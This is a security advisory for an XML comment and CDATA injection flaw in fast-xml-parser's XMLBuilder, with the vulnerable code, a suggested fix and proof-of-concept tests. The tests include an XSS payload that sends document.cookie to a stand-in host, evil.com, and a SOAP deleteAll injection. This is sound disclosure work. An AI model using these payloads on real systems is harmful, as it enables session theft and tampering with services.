# [M] fast-xml-parser XMLBuilder: XML Comment and CDATA Injection via Unescaped Delimiters

## Summary
Severity: Medium
Advisory: GHSA-gh4j-gqv2-49f6
CVE: CVE-2026-41650
CWE: CWE-91
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-gh4j-gqv2-49f6
Type: github-advisory

## Affected
- npm: `fast-xml-parser` — affected >=0 <5.7.0

## Details
# fast-xml-parser XMLBuilder: Comment and CDATA Injection via Unescaped Delimiters

## Summary

fast-xml-parser XMLBuilder does not escape the `-->` sequence in comment content or the `]]>` sequence in CDATA sections when building XML from JavaScript objects. This allows XML injection when user-controlled data flows into comments or CDATA elements, leading to XSS, SOAP injection, or data manipulation.

Existing CVEs for fast-xml-parser cover different issues:
- CVE-2023-26920: Prototype pollution (parser)
- CVE-2023-34104: ReDoS (parser)
- CVE-2026-27942: Stack overflow in XMLBuilder with preserveOrder
- CVE-2026-25896: Entity encoding bypass via regex in DOCTYPE entities

This finding covers **unescaped comment/CDATA delimiters in XMLBuilder** - a distinct vulnerability.

## Vulnerable Code

**File**: `src/fxb.js`

```javascript
// Line 442 - Comment building with NO escaping of -->
buildTextValNode(val, key, attrStr, level) {
    // ...
    if (key === this.options.commentPropName) {
        return this.indentate(level) + `<!--${val}-->` + this.newLine;  // VULNERABLE
    }
    // ...
    if (key === this.options.cdataPropName) {
        return this.indentate(level) + `<![CDATA[${val}]]>` + this.newLine;  // VULNERABLE
    }
}
```

Compare with attribute/text escaping which IS properly handled via `replaceEntitiesValue()`.

## Proof of Concept

### Test 1: Comment Injection (XSS in SVG/HTML context)

```javascript
import { XMLBuilder } from 'fast-xml-parser';

const builder = new XMLBuilder({
  commentPropName: "#comment",
  format: true,
  suppressEmptyNode: true
});

const xml = {
  root: {
    "#comment": "--><script>alert('XSS')</script><!--",
    data: "legitimate content"
  }
};

console.log(builder.build(xml));
```

**Output**:
```xml
<root>
  <!----><script>alert('XSS')</script><!---->
  <data>legitimate content</data>
</root>
```

### Test 2: CDATA Injection (RSS feed)

```javascript
const builder = new XMLBuilder({
  cdataPropName: "#cdata",
  format: true,
  suppressEmptyNode: true
});

const rss = {
  rss: { channel: { item: {
    title: "Article",
    description: {
      "#cdata": "Content]]><script>fetch('https://evil.com/'+document.cookie)</script><![CDATA[more"
    }
  }}}
};

console.log(builder.build(rss));
```

**Output**:
```xml
<rss>
  <channel>
    <item>
      <title>Article</title>
      <description>
        <![CDATA[Content]]><script>fetch('https://evil.com/'+document.cookie)</script><![CDATA[more]]>
      </description>
    </item>
  </channel>
</rss>
```

### Test 3: SOAP Message Injection

```javascript
const builder = new XMLBuilder({
  commentPropName: "#comment",
  format: true
});

const soap = {
  "soap:Envelope": {
    "soap:Body": {
      "#comment": "Request from user: --><soap:Body><Action>deleteAll</Action></soap:Body><!--",
      Action: "getBalance",
      UserId: "12345"
    }
  }
};

console.log(builder.build(soap));
```

**Output**:
```xml
<soap:Envelope>
  <soap:Body>
    <!--Request from user: --><soap:Body><Action>deleteAll</Action></soap:Body><!---->
    <Action>getBalance</Action>
    <UserId>12345</UserId>
  </soap:Body>
</soap:Envelope>
```

The injected `<Action>deleteAll</Action>` appears as a real SOAP action element.

## Tested Output

All tests run on Node.js v22, fast-xml-parser v5.5.12:

```
1. COMMENT INJECTION:
   Injection successful: true

2. CDATA INJECTION (RSS feed scenario):
   Injection successful: true

4. Round-trip test:
   Injection present: true

5. SOAP MESSAGE INJECTION:
   Contains injected Action: true
```

## Impact

An attacker who controls data that flows into XML comments or CDATA sections via XMLBuilder can:

1. **XSS**: Inject `<script>` tags into XML/SVG/HTML documents served to browsers
2. **SOAP injection**: Modify SOAP message structure by injecting XML elements
3. **RSS/Atom feed poisoning**: Inject scripts into RSS feed items via CDATA breakout
4. **XML document manipulation**: Break XML structure by escaping comment/CDATA context

This is practically exploitable whenever applications use XMLBuilder to generate XML from data that includes user-controlled content in comments or CDATA (e.g., RSS feeds, SOAP services, SVG generation, config files).

## Suggested Fix

Escape delimiters in comment and CDATA content:

```javascript
// For comments: replace -- with escaped equivalent
if (key === this.options.commentPropName) {
    const safeVal = String(val).replace(/--/g, '&#45;&#45;');
    return this.indentate(level) + `<!--${safeVal}-->` + this.newLine;
}

// For CDATA: split on ]]> and rejoin with separate CDATA sections
if (key === this.options.cdataPropName) {
    const safeVal = String(val).replace(/]]>/g, ']]]]><![CDATA[>');
    return this.indentate(level) + `<![CDATA[${safeVal}]]>` + this.newLine;
}
```

## References
- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-gh4j-gqv2-49f6
- https://nvd.nist.gov/vuln/detail/CVE-2026-41650
- https://github.com/NaturalIntelligence/fast-xml-parser
- https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.6.0
